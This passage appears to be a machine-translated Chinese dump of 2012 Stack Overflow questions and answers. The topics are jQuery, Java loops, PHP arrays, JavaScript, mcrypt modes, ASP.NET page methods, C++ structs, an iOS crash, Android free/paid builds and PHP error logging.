    var id = goalcard.Id;
    this.href = this.href + '/' + id;
}); 
```

这应该可行，但发生的情况是我必须在`forEach`循环内使用这个点击函数才能到达目标卡变量。如果我把它放在里面`forEach`，这个 Click 函数将被执行多次，具体取决于有多少个球门卡。

所以结果是 `/AnswerNKI/AnswerForm/1/2`如果有两张球门卡。或者`/AnswerNKI/AnswerForm/1/2/3/4/5`如果有五张球门卡。

但应该是`/AnswerNKI/AnswerForm/1`

它基本上加起来了。

另一个问题是所有其他行都有 `/AnswerNKI/AnswerForm/`所以只有第一行基本上有一个 id。

我不知道如何找到解决该问题的解决方案。

非常感谢任何形式的帮助。

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T14:19:57.037

这不是解决您遇到的特定问题的方法。但看起来您正在使用 jquery 来更新页面的一部分。

如果是这样，您是否考虑过使用返回由 PartialView 生成的 html 的回调，并且只是在 javascript 回调中进行替换？这是我经常使用的模式。它允许您使用 MVC 引擎、组件和设计工具。

这是我做的一个例子：

```
$("form.unscoped_filter").live("submit", function () {
    $.ajax({
            url: this.action,
            type: this.method,
            data: $(this).serialize(),
            error: function (a, b) {
                debugger;
            },
            success: function (result) {
                $("div#targetID").html(result);
                bindExtenders();
            }
        });
        return false;
    }); 
```

这个特定的示例从特定类别的表单中截取回发，并将其传递到由我的 MVC 应用程序处理的网站。按照通常的 MVC 设计方法，在 BeginForm 块中设置目标方法和控制器。目标方法处理数据并返回一个 PartialView，它将数据转换为 html，然后将其发送到 jquery 块中的成功回调。它用于替换目标 div 中的 html。虽然有更多部分在起作用（例如，javascript、MVC 方法、PartialView），但以这种方式分离事物可以让每个部分发挥其独特的优势：jquery 擅长操纵 DOM，MVC 方法擅长操纵/处理对 html 的请求，PartialViews 是一个很好的布局和生成 html 的工具。

一旦掌握了窍门，这是一种非常灵活且功能强大的方法。特别是，您可以使用 html5 技术将参数从 ActionLink 传递到 jquery 块。例如，您可以将“data-someParamName=...”添加到 ActionLink 调用的 html 属性中，然后在 javascript 块中提取参数值，执行以下操作：

```
var pagerCode = $(this).attr("data-someParamName"); 
```

事实上，这就是我控制在成功回调函数中更新哪个特定 div 的方式。

同样，这并没有回答您的具体问题，而是提出了一种不同的方式来解决我认为您正在尝试做的事情。祝你好运！

# java - Java - 方法的输出

> ID：10499800
> 
> 赞同：0
> 
> 时间：2012-05-08T13:41:37.880
> 
> 标签：java

查看这种特定方法的输出让我感到困惑。我试图确切地了解它在做什么。

这是方法：

```
for (int i = 0; i < 4; i ++) {
    for (int j = 0; j < 9; j++) {
    if (j==5) {
        break;
    }
    if ((j==0) || (i==0)) {
        continue;
    }
    if (!((j*i % 3) != 0)) {
    System.out.println(j*i);
    }
} 
```

}

我知道输出是什么，但我仍然不确定它是如何工作的，这就是我在这里问的原因。因此，此方法将遍历 j 直到达到 5，然后中断。

然后它增加 i，j 为 0。J ！= 5 所以它不会中断，j == 0 所以继续但是 J 变成 3，我是 1。这就是我迷路的地方。3是哪来的？？

我用它来打印幕后发生的事情

```
 public static void tester() {
    for (int i = 0; i < 4; i ++) {
        for (int j = 0; j < 9; j++) {
            if (j==5) {
                System.out.println("j == 5, breaking");
                break;
            }
            if ((j==0) || (i==0)) {
                System.out.println("J is " + j);
                System.out.println("I is " + i);
                System.out.println("j or i == 0, continuing");
                continue;
            }
            if (!((j*i % 3) != 0)) {
                System.out.println("J is " + j);
                System.out.println("I is " + i);
                System.out.println(j*i);
            }
        }
        System.out.println();
    }
} 
```

输出如下：

```
J is 0

I is 0

j or i == 0, continuing

J is 1

I is 0

j or i == 0, continuing

J is 2

I is 0

j or i == 0, continuing

J is 3

I is 0

j or i == 0, continuing

J is 4

I is 0

j or i == 0, continuing

j == 5, breaking

J is 0

I is 1

j or i == 0, continuing

J is 3

I is 1

3

j == 5, breaking

J is 0

I is 2

j or i == 0, continuing

J is 3

I is 2

6

j == 5, breaking

J is 0

I is 3

j or i == 0, continuing

J is 1

I is 3

3

J is 2

I is 3

6

J is 3

I is 3

9

J is 4

I is 3

12

j == 5, breaking 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:49:18.990

当 j=2 和 i=1 时，您`!((j*i % 3) != 0)`返回 false，因此它不会进入该条件（也不是其他条件）并且没有输出。这就是为什么它似乎跳过了 j=2。当 j==2 时添加一个附加`System.out.println()`项，您会看到它出现。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:50:23.343

（`3`以及后来的`6`），是从这段代码中发生的......

```
 if (!((j*i % 3) != 0)) {
            System.out.println("J is " + j);
            System.out.println("I is " + i);
            System.out.println(j*i);
        } 
```

实际上`!((j*i % 3) != 0)`是说，当`j*i/3`有 余数时`0`，它会运行该`if`语句中的代码。换句话说，只要是( , , , )的倍数，它就会运行此`if`代码`j*i``3``3``6``9``12`

逻辑很难遵循 - 最好这样写......

```
 if ((j*i % 3) == 0) {
            System.out.println("J is " + j);
            System.out.println("I is " + i);
            System.out.println(j*i);
        } 
```

以原始方式，所有`!`符号和多个括号/大括号使其难以阅读。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:51:06.807

您的下一个输出的原因`i=1` `j = 3`是因为 for`j=2`和`j=1`所有 3`ifs`都是错误的。

你有

1.  `j=1` `i=1`
2.  `1*1 % 3`这是`1`
3.  `1 != 0`这是`true`
4.  `!(true)`这是`false`

和

1.  `j=2` `i=1`
2.  `2*1 % 3`这是`2`
3.  `2 != 0`这是`true`
4.  `!(true)`这是`false`

最后

1.  `j=3` `i=1`
2.  `3*1 % 3`这是`0`
3.  `0 != 0`这是`false`
4.  `!(false)`这是`true`

所以你打印出答案

如果你想看到我会移动的一切

```
System.out.println("J is " + j); 
System.out.println("I is " + i); 
```

在这种方式之外，`ifs`它为循环的每次迭代打印

# php - 将关联数组转换为索引数组的优雅方法

> ID：10499805
> 
> 赞同：1
> 
> 时间：2012-05-08T13:41:51.973
> 
> 标签：php, arrays

有一个关联数组

```
$myarray = array (
  'user' => array (
      2 => 'john',
      5 => 'done',
      21 => 'foo'
  ),
  'city' => array (
      2 => 'london',
      5 => 'buenos aires',
      21 => 'paris',
  ),
  'age' => array (
      2 => 24,
      5 => 38,
      21 => 16
  )
  ...
); 
```

**编辑**
**假设我不知道这个数组有多少个键，也不知道键本身（它们可能是什么）**上面只是一个例子

有没有优雅的方法（使用内置函数而不是循环）将它转换成

```
$result = array(
    array(
        'user',
        'city',
        'age'
        ...
    ),
    array(
        'john',
        'london',
        24
        ...
    ),
    array(
        'done',
        'buenos aires',
        38
        ...
    ),
    array(
        'foo',
        'paris',
        16
        ...
    )
); 
```

作为一个附带问题：如何也获得这个（以类似的优雅方式）

```
$result = array(
    array(
        'row',
        'user',
        'city',
        'age'
        ...
    ),
    array(
        2,
        'john',
        'london',
        24
        ...
    ),
    array(
        5,
        'done',
        'buenos aires',
        38
        ...
    ),
    array(
        21,
        'foo',
        'paris',
        16
        ...
    )
); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:44:46.887

请注意，这两个操作基本上都是原始数组的转置。

所有这些都强烈改编自[这个答案](https://stackoverflow.com/a/797268/1256624)（考虑支持它！）。

## 帮手

首先，我们需要一个辅助函数，它将行标题作为关联数组中的键：

```
function flipArrayKeys($arr) {
    $out = array('row' => array_keys($arr));
    foreach ($arr as $key => $subarr) {
        foreach ($subarr as $subkey => $subvalue) {
            $out[$subkey][] = $subvalue;
        }
    }
    return $out;
} 
```

`flipArrayKeys($myarray)`给出：

```
array (
  'row' => 
  array (
    0 => 'user',
    1 => 'city',
    2 => 'age',
  ),
  2 => 
  array (
    0 => 'john',
    1 => 'london',
    2 => 24,
  ),
  5 => 
  array (
    0 => 'done',
    1 => 'buenos aires',
    2 => 38,
  ),
  21 => 
  array (
    0 => 'foo',
    1 => 'paris',
    2 => 16,
  ),
) 
```

* * *

## 第1部分

```
$result = array_values(flipArrayKeys($myarray)); 
```

现在结果看起来像：

```
array (
  0 => 
  array (
    0 => 'user',
    1 => 'city',
    2 => 'age',
  ),
  1 => 
  array (
    0 => 'john',
    1 => 'london',
    2 => 24,
  ),
  2 => 
  array (
    0 => 'done',
    1 => 'buenos aires',
    2 => 38,
  ),
  3 => 
  array (
    0 => 'foo',
    1 => 'paris',
    2 => 16,
  ),
) 
```

这部分也可以使用`transpose`这个[答案](https://stackoverflow.com/a/3423692/1256624)来完成：

```
$result = transpose($myarray);
array_unshift($result, array_keys($myarray)); 
```

* * *

## 第2部分

```
function flipArrayWithHeadings($arr) {
    $out = flipArrayKeys($arr);

    foreach (array_keys($out) as $key) {
        array_unshift($out[$key],$key);
    }
    return array_values($out);
} 
```

所以`flipArrayWithHeadings($myarray)`看起来像：

```
array (
  0 => 
  array (
    0 => 'row',
    1 => 'user',
    2 => 'city',
    3 => 'age',
  ),
  1 => 
  array (
    0 => 2,
    1 => 'john',
    2 => 'london',
    3 => 24,
  ),
  2 => 
  array (
    0 => 5,
    1 => 'done',
    2 => 'buenos aires',
    3 => 38,
  ),
  3 => 
  array (
    0 => 21,
    1 => 'foo',
    2 => 'paris',
    3 => 16,
  ),
) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-08T13:45:31.813

将`array_values`函数用作：

```
$result = array(array_values($myarray['user']), 
          array_values($myarray['city']), 
          array_values($myarray['age'])); 
```

对于问题的第二部分，您可以执行以下操作：

```
$result2 = array_keys($myarray);

foreach(array_keys($myarray['user']) as $k) {
  $result2[] = array($k, $myarray['user'][$k], $myarray['city'][$k], $myarray['age'][$k]);
} 
```

# javascript - 使用 javascript 将值动态推送到数组中

> ID：10499809
> 
> 赞同：1
> 
> 时间：2012-05-08T13:42:03.753
> 
> 标签：javascript, arrays, array-push

我很难找到一种将值动态推送到数组中的方法。我给出了以下情况：

```
var get_anchors= new Array('pitzel','mitzel','sizzle') 

current_anchor= pics[key].anchor; //has the value 'sizzle'

get_anchors[current_anchor].push(new Array('sizzle2','sizzle3')) 
```

Javascript失败并说`get_anchors[current_anchor] is undefined`

我怎样才能`get_anchors[current_anchor]`工作。还是有其他方法可以完成这项工作？

所需的结果应类似于 'pitzel','mitzel','sizzle'['sizzle2','sizzle3]

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-08T14:11:58.200

根据您的评论，您似乎想要一个哈希映射而不是数组。您可以为此使用对象：

```
var anchors = {
    'pitzel': [],
    'mitzel': [],
    'sizzle': []
}; 
```

然后你可以这样做：

```
anchors[current_anchor].push('sizzle2', 'sizzle3'); 
```

或假设`anchors`没有值为 的属性`current_anchor`，只需分配一个新数组：

```
anchors[current_anchor] = ['fooX', 'fooY']; 
```

当然，您也可以动态填充对象。查看[*使用对象*](https://developer.mozilla.org/en/JavaScript/Guide/Working_with_Objects)了解更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T13:54:39.423

我不确定我是否理解您要执行的操作，但我认为您正在尝试在另一个发生的位置之后插入一些元素。这可以解决问题：

```
var get_anchors = [ 'pitzel', 'mitzel', 'sizzle' ];

current_anchor = get_anchors.indexOf(pics[key].anchor);
get_anchors.splice(current_anchor + 1, 0, 'sizzle2', 'sizzle3');

// get_anchors = [ 'pitzel', 'mitzel', 'sizzle', 'sizzle2', 'sizzle3' ] 
```

# php - mcrypt 具有不同文件的最佳算法

> ID：10499812
> 
> 赞同：-1
> 
> 时间：2012-05-08T13:42:08.757
> 
> 标签：php, performance, algorithm, security

用 php 编程的存储服务器（WebDAV）加密/解密不同文件（大小在 1Byte 和 3GB 之间）的最佳算法（安全性和性能）是什么？AES256？为什么？我应该使用哪种 mcrypt 模式？（欧洲央行？）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:49:49.897

出于安全考虑，使用 CBC（它仅在 CPU 性能上有所不同，即使对于最快的驱动器，在 CBC 模式下使用 AES 的 CPU 性能也太快了）。

避免使用 ECB，它真的很容易被破解，尤其是对于大型数据集。如果 CBC 模式不可用，请在使用 ECB 之前先使用很长的密码进行压缩和 XOR。

您是否需要在随机搜索点进行动态解密？如果是，请忽略上述内容，使用 ECB，并编写文件 IO 层以从每个块的开头进行解密。请记住，这对安全性非常不利（至少尝试根据您的每个块的秘密算法更改密钥）。

AES 模式在[这里](https://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb/)进行了辩论。

# jquery - 在 aspx 中从 jquery 调用函数背后的代码

> ID：10499815
> 
> 赞同：3
> 
> 时间：2012-05-08T13:42:21.990
> 
> 标签：jquery, asp.net

我想从 jquery 调用一个代码隐藏函数。

aspx 文件名为 group_master.aspx

jQuery是

```
 function populatecontrol(list, control) {
    var id = 0;
var GroupName=document.getElementById('<%=hdnGroupNameCheck.ClientID %>');
if (list.length > 0) {
    $.each(list, function (key, value) {

        var obj = JSON.parse(value);
        document.getElementById('<%=hdnGroupNameCheck.ClientID %>').value=obj.Second;
        control.html("Group already exist").append('<a id="editclick" href ="edit('+obj.Second+')">Click here to edit or enquire</a>');

    });
}
else
control.text="Group does not exist"
} 
```

edit('+obj.Second+') 是代码隐藏中的一个编辑函数。

谢谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:48:01.203

这听起来像是`Page Methods`. 有关更多详细信息，请参阅本教程：

[使用jQuery直接调用ASP.NET AJAX页面方法](http://encosia.com/using-jquery-to-directly-call-aspnet-ajax-page-methods/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T17:36:43.613

您需要将方法后面的代码设为静态，还需要将其标记为 [WebMethod] 以便将其视为服务方法，然后使用 jQuery ajax 调用，您可以调用方法后面的代码，例如：

```
var loc = window.location.href;
$.ajax({
     type: 'POST',
      url: loc + "/GetMessage",
      data: "{}",
      contentType: "application/json; charset=utf-8"

    })
    .success(function (response) {
      alert(response.d);

    })
    .error(function (response) {
      alert(response.d);
    }); 
```

在此处获取完整示例：http: [//www.codegateway.com/2012/05/jquery-call-page-codebehind-method.html](http://www.codegateway.com/2012/05/jquery-call-page-codebehind-method.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T13:47:54.027

我推荐使用页面方法。简而言之，您将在您的代码中创建一个 Web 方法，该方法将由您的 jQuery 逻辑调用。

有关示例，请参见此链接：[asp.net 中的页面方法](http://weblogs.asp.net/jalpeshpvadgama/archive/2011/12/24/page-methods-in-asp-net.aspx)

# c# - 回发后动态创建的 div 被隐藏

> ID：10499827
> 
> 赞同：0
> 
> 时间：2012-05-08T13:42:52.030
> 
> 标签：c#, asp.net

我在嵌套的 gridview 中有几个 div，它们使用命令 div id="div<%# Eval("id") %>" 绑定到 att 运行时。然后我通过javascript设置div的可见性。问题是在回发之间没有保留可见性设置。（我使用过滤器功能来过滤嵌套网格视图中的行）。

如何保留动态创建的所有 div 的可见性设置？（最多可达 50 个 div。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:45:07.837

如果您使用 javascript 使 div 可见，则当您回发它们时，它们不会保存其当前状态。但是，每次使用 javascript 更改状态时，您都可以进行 ajax 调用以更新数据库的当前状态。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T14:01:42.010

如果在数据库中存储 div 的状态没有意义：在 asp:hiddenfield 中存储哪些 div 已设置为可见/不可见。然后当页面重新加载时，重置 div 的可见状态。

# c++ - 我有一个变量，是结构中的许多变量之一，我想将信息读入其中

> ID：10499828
> 
> 赞同：0
> 
> 时间：2012-05-08T13:43:08.440
> 
> 标签：c++, struct, user-input

在我决定使用这种技术输入信息之前，我能够得到一个干净的编译。一旦我克服了这个障碍，我将能够尝试各种场景并测试代码。

```
#include <iostream>
#include <sstream>
#include <string>

int main (void)
   {
    float test;                     /* a simple variable */

    struct seTup_backS_Format       /* the structure has about 30 variables */
       {
        float grnd_Elev;
        int many;     
       };

    string line;                    /* a string */

    getline(cin,line);
    stringstream (line) >> test;    // no problem

                                    // when I try

    stringsteam (line) >> seTup_backS_Format.grnd_Elev;    

               // the compiler says, expected primary-expression before '.' token ----

   } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T13:45:09.380

您已声明结构类型，但未声明结构变量。你应该改变你的代码如下：

```
struct seTup_backS_Format       /* the structure has about 30 variables */
   {
    float grnd_Elev;
    int many;     
   } setup; // Declare a variable "setup" of type "struct seTup_backS_Format"

string line;                    /* a string */

getline(cin,line);
stringstream (line) >> test;    // no problem

                                // when I try

stringsteam (line) >> setup.grnd_Elev; 
```

# iphone - 我的应用程序因此错误而终止。有任何想法吗？

> ID：10499830
> 
> 赞同：0
> 
> 时间：2012-05-08T13:43:16.997
> 
> 标签：iphone, objective-c, xcode, tabbarcontroller

```
2012-05-08 21:33:34.279 Passwordapp[384:fb03] Setting up a Fetched Results Controller for the Entity named Role
2012-05-08 21:33:34.292 Passwordapp[384:fb03] There's stuff in the database so skipping the import of default data
2012-05-08 21:33:34.293 Passwordapp[384:fb03] -[LoginViewController viewControllers]: unrecognized selector sent to instance 0x8e7d750
2012-05-08 21:33:34.301 Passwordapp[384:fb03] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[LoginViewController viewControllers]: unrecognized selector sent to instance 0x8e7d750'
*** First throw call stack:
(0x1359022 0x1742cd6 0x135acbd 0x12bfed0 0x12bfcb2 0x2db6 0x390386 0x391274 0x3a0183 0x3a0c38 0x394634 0x1f93ef5 0x132d195 0x1291ff2 0x12908da 0x128fd84 0x128fc9b 0x390c65 0x392626 0x25cd 0x2535)
terminate called throwing an exception(lldb) 

#import <UIKit/UIKit.h>
#import "passconst.h"

@interface LoginViewController : UIViewController <UITextFieldDelegate>

@property (nonatomic) BOOL pinValidated;

@end

#import "LoginViewController.h"
#import "KeychainWrapper.h"

@implementation LoginViewController
@synthesize pinValidated;

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
        // Custom initialization
    }
    return self;
}

- (void)didReceiveMemoryWarning
{
    // Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];

    // Release any cached data, images, etc that aren't in use.
}

// Helper method to congregate the Name and PIN fields for validation.
- (BOOL)credentialsValidated 
{
    NSString *name = [[NSUserDefaults standardUserDefaults] stringForKey:USERNAME];
    BOOL pin = [[NSUserDefaults standardUserDefaults] boolForKey:PIN_SAVED];
    if (name && pin) {
        return YES;
    } else {
        return NO;
    }
}

- (void)presentAlertViewForPassword 
{

    // 1
    BOOL hasPin = [[NSUserDefaults standardUserDefaults] boolForKey:PIN_SAVED];

    // 2
    if (hasPin) {
        // 3
        NSString *user = [[NSUserDefaults standardUserDefaults] stringForKey:USERNAME];
        NSString *message = [NSString stringWithFormat:@"What is %@'s password?", user];
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Enter Password" 
                                                        message:message  
                                                       delegate:self 
                                              cancelButtonTitle:@"Cancel" 
                                              otherButtonTitles:@"Done", nil];
        // 4
        [alert setAlertViewStyle:UIAlertViewStyleSecureTextInput]; // Gives us the password field
        alert.tag = kAlertTypePIN;
        // 5
        UITextField *pinField = [alert textFieldAtIndex:0];
        pinField.delegate = self;
        pinField.autocapitalizationType = UITextAutocapitalizationTypeWords;
        pinField.tag = kTextFieldPIN;
        [alert show];
    } else {
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Setup Credentials" 
                                                        message:@"Secure your Password list!"  
                                                       delegate:self 
                                              cancelButtonTitle:@"Cancel" 
                                              otherButtonTitles:@"Done", nil];
        // 6
        [alert setAlertViewStyle:UIAlertViewStyleLoginAndPasswordInput];
        alert.tag = kAlertTypeSetup;
        UITextField *nameField = [alert textFieldAtIndex:0];
        nameField.autocapitalizationType = UITextAutocapitalizationTypeWords;
        nameField.placeholder = @"Name"; // Replace the standard placeholder text with something more applicable
        nameField.delegate = self;
        nameField.tag = kTextFieldName;
        UITextField *passwordField = [alert textFieldAtIndex:1]; // Capture the Password text field since there are 2 fields
        passwordField.delegate = self;
        passwordField.tag = kTextFieldPassword;
        [alert show];
    }
}

- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex 
{
    if (alertView.tag == kAlertTypePIN) {
        if (buttonIndex == 1 && self.pinValidated) { // User selected "Done"
            [self performSegueWithIdentifier:@"Loginsegue" sender:self];
            self.pinValidated = NO;
        } else { // User selected "Cancel"
            [self presentAlertViewForPassword];
        }
    } else if (alertView.tag == kAlertTypeSetup) {
        if (buttonIndex == 1 && [self credentialsValidated]) { // User selected "Done"
            [self performSegueWithIdentifier:@"Loginsegue" sender:self];
        } else { // User selected "Cancel"
            [self presentAlertViewForPassword];
        }
    }
}

#pragma mark - Text Field + Alert View Methods
- (void)textFieldDidEndEditing:(UITextField *)textField 
{
    // 1
    switch (textField.tag) {
        case kTextFieldPIN: // We go here if this is the 2nd+ time used (we've already set a PIN at Setup).
            NSLog(@"User entered PIN to validate");
            if ([textField.text length] > 0) {
                // 2
                NSUInteger fieldHash = [textField.text hash]; // Get the hash of the entered PIN, minimize contact with the real password
                // 3
                if ([KeychainWrapper compareKeychainValueForMatchingPIN:fieldHash]) { // Compare them
                    NSLog(@"** User Authenticated!!");
                    self.pinValidated = YES;
                } else {
                    NSLog(@"** Wrong Password :(");
                    self.pinValidated = NO;
                }
            }
            break;
        case kTextFieldName: // 1st part of the Setup flow.
            NSLog(@"User entered name");
            if ([textField.text length] > 0) {
                [[NSUserDefaults standardUserDefaults] setValue:textField.text forKey:USERNAME];
                [[NSUserDefaults standardUserDefaults] synchronize];
            }
            break;
        case kTextFieldPassword: // 2nd half of the Setup flow.
            NSLog(@"User entered PIN");
            if ([textField.text length] > 0) {
                NSUInteger fieldHash = [textField.text hash];
                // 4
                NSString *fieldString = [KeychainWrapper securedSHA256DigestHashForPIN:fieldHash];
                NSLog(@"** Password Hash - %@", fieldString);
                // Save PIN hash to the keychain (NEVER store the direct PIN)
                if ([KeychainWrapper createKeychainValue:fieldString forIdentifier:PIN_SAVED]) {
                    [[NSUserDefaults standardUserDefaults] setBool:YES forKey:PIN_SAVED];
                    [[NSUserDefaults standardUserDefaults] synchronize];
                    NSLog(@"** Key saved successfully to Keychain!!");
                }                
            }
            break;
        default:
            break;
    }
}

#pragma mark - View lifecycle

- (void)viewDidLoad
{
    [super viewDidLoad];
    self.pinValidated = NO;
}

- (void)viewDidAppear:(BOOL)animated 
{
    [super viewDidAppear:animated];
    [self presentAlertViewForPassword];
    [super viewDidAppear:animated];

    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"MainStoryboard" bundle:nil];
    UIViewController *vc = [storyboard instantiateViewControllerWithIdentifier:@"LoginViewController"];
    [vc setModalPresentationStyle:UIModalPresentationFullScreen];

    [self presentModalViewController:vc animated:YES];
}

- (void)viewDidUnload
{
    [super viewDidUnload];
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    // Return YES for supported orientations
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}

@end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:47:44.810

在您的项目中，您尝试调用 [loginViewControllerObject viewController]; 这是一种导航控制器方法

# java - 如何维护应用程序的付费和免费版本

> ID：10499831
> 
> 赞同：17
> 
> 时间：2012-05-08T13:43:18.977
> 
> 标签：java, android, eclipse

我已经构建了一个游戏应用程序的免费版本，现在市场上的名称类似于 com.mycompany.myfreegame。现在我想做一个付费版本。毫无疑问，未来几年都需要对这两个版本进行调整和错误修复，因此我想以尽可能紧凑的方式封装免费和付费信息的编码，以便我可以同时修复两个版本中的错误。

如果在运行时处理了两个版本之间的全部差异，那么我可以在源代码中设置一个标志，这将是问题的结束。不幸的是，还有两件事需要考虑，

1.  包的名称在两个版本之间需要不同。
2.  一些xml需要不同。例如，免费版需要线性布局来放置广告，而付费版则不需要。

实现这一目标的最简单方法是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-08T14:03:21.313

我认为我尝试的第一种方法是在 Eclipse 中使用 3 个项目：一个用于任一版本的游戏，一个用于包含所有共享代码的库项目。库项目将是您核心游戏玩法的所有代码所在，版本特定项目管理加载不同的布局，在免费版本中放置广告，以及向付费版本添加关卡/功能/帽子。

您也许可以使用 ant 任务使用编译器标志来实现单个代码库的目标，但这超出了我的范围。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-08T14:09:31.023

我认为您正在寻找的是图书馆项目[http://developer.android.com/guide/developing/projects/index.html#LibraryProjects](http://developer.android.com/guide/developing/projects/index.html#LibraryProjects)

从那个网页：

`If you are creating an application that exists in both free and paid versions. You move the part of the application that is common to both versions into a library project. The two dependent projects, with their different package names, will reference the library project and provide only the difference between the two application versions.`

另一个问题，与这个问题非常相似，似乎有一个不错的讨论和答案：[Multiple Apps with a shared code base](https://stackoverflow.com/questions/9515230/multiple-apps-with-a-shared-code-base)

编辑：这是关于如何实现库项目的链接。[http://developer.android.com/guide/developing/projects/projects-eclipse.html](http://developer.android.com/guide/developing/projects/projects-eclipse.html)

关于不同版本略有不同，库项目可以容纳。首先构建库项目，然后最后构建父项目（使用库的项目）并将它们合并在一起。两个项目都可以定义相同的资源标识符，并且最后构建的项目（父项目）获得优先权（覆盖）。所以本质上，您可以在父/调用应用程序中覆盖字符串/布局（可能更多，不确定？）。

例如：假设您有两个项目，免费和付费。您可以使用默认实现（免费版本）创建一个字符串，并在您的付费版本（父应用程序）中覆盖它。

共享库 Strings.xml 文件中的代码：

```
<string name="AppName">My Application (Free)</string> 
```

父应用 Strings.xml 文件中的代码：

```
<string name="AppName">My Application Premium</string> 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-08T14:17:09.717

我会选择[Maven](http://maven.apache.org/)。您可以定义具有三个子项目的父项目，例如：

*   常见的
*   有薪酬的
*   自由

Maven 允许拥有不同的配置文件，同时拥有相同的代码库。

例如，我目前有一个使用两个数据库的项目，因此所有应用程序配置文件都保留在一个公共项目中，其中数据库配置文件和类保留在每个项目文件夹中。当我在父级中进行构建时，每个子项目都会构建，单元测试通过等等......

而且，这只是maven的千种优势之一！

编辑：我刚刚发现，你有一个适用于 maven 的[android-plugin](http://code.google.com/p/maven-android-plugin/)，还有很酷的功能

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-06-24T22:29:51.153

现在可能最好的方法是使用Android Studio + gradle。这种情况下允许在控制台中使用一个命令构建付费和免费版本。更多详细信息在这篇文章中：[https ://stackoverflow.com/a/17286142/1705370](https://stackoverflow.com/a/17286142/1705370)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-08T14:09:50.430

我认为您正在寻找类似的东西：

[来自单一源代码的多个 Android 应用程序包 .apk 文件](https://stackoverflow.com/questions/7507784/multiple-android-application-package-apk-files-from-single-source-code)

基本上，这里最简单的方法是拥有两个不同的清单文件和两个不同的主要活动，并使用 Ant 切换编译，尽管后者是可选的。

希望能帮助到你。

# php - 如何按文件夹设置error_log？

> ID：10499832
> 
> 赞同：6
> 
> 时间：2012-05-08T13:43:20.313
> 
> 标签：php, apache, webserver, cpanel, error-log

我公司有一个很大的主机，但是不是我们管理的，我们看不到配置文件，但是我想在我们本地的测试服务器上回复这个功能。

我是公司的新人，想开始调试应用程序以解决客户的一些次要问题和主要问题，但是文件量太大以至于单个*error_file*很大.. 有很多人在做这个，所以每个我检查日志的时间（比如 30 秒到 1 分钟）有数百行添加。

我不知道这是在 Apache 上，通过*.htaccess*文件还是在*php.ini*中设置的。

我说的是 PHP 错误，但我不知道这是在 PHP、Apache 中设置的，还是使用第三方库。

我不是在谈论设置特定文件夹 error_log。我说的是脚本文件夹中是否记录了错误。

示例：我创建了一个名为 test1 的文件夹。在里面我做了一些错误的 PHP 脚本，它会抛出一些错误。当我运行脚本时，我可以看到在文件夹中创建了一个*error_log*文件。所以它可以即时运行。

我试图询问托管公司支持他们如何做到这一点，但他们没有回答我。

* * *

我不知道是否可能是某种[cPanel](https://en.wikipedia.org/wiki/CPanel)设置（顺便说一句，托管支持的东西也不理解这个问题，但是……通常 1 级支持无法处理技术问题）。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-22T22:09:29.467

我找到了。

您必须在*php.ini*文件中设置如下指令，字符串“error_log”。右侧是您想要的日志文件名，

```
error_log = error_log 
```

这将在执行脚本的文件夹中生成一个 PHP 错误日志，

我会尽力解释。

文件夹*/www/site/lib*中的脚本*test.php*：

 *```
include "./db_conn.php"; 
```

如果文件*db_conn.php*不在同一目录中，则会触发警告和错误。通常这将导致服务器/虚拟主机日志，但使用此指令您将在*/www/site/lib*目录下获得一个*error_log*文件。

 *我为什么要找这个？好吧，正如我所写，我正在开发一个巨大的应用程序，其中包含数千个文件，许多文件会发出警告、通知等。我不是项目中唯一的一个，并且站点*error_log*文件非常大，很难保存跟踪一个或只是一些文件的调试演变。现在我只需要跟踪我正在工作的目录中的日志。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T14:12:09.760

您可以通过将其添加到您的*vhost*或*htaccess*文件来管理日志

```
ErrorLog /path/to/a/writable/directory/error.log 
```

有关更多信息，请查看这篇关于通过[*htaccess*](http://perishablepress.com/advanced-php-error-handling-via-htaccess/)[进行高级 PHP 错误处理](http://perishablepress.com/advanced-php-error-handling-via-htaccess/)*的文章。*

 ** * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T14:30:22.660

要在 PHP 中执行此操作，请编辑文件*php.ini*并添加该行

```
error_log = /path/to/where/you/want/your/php-errors.log 
```

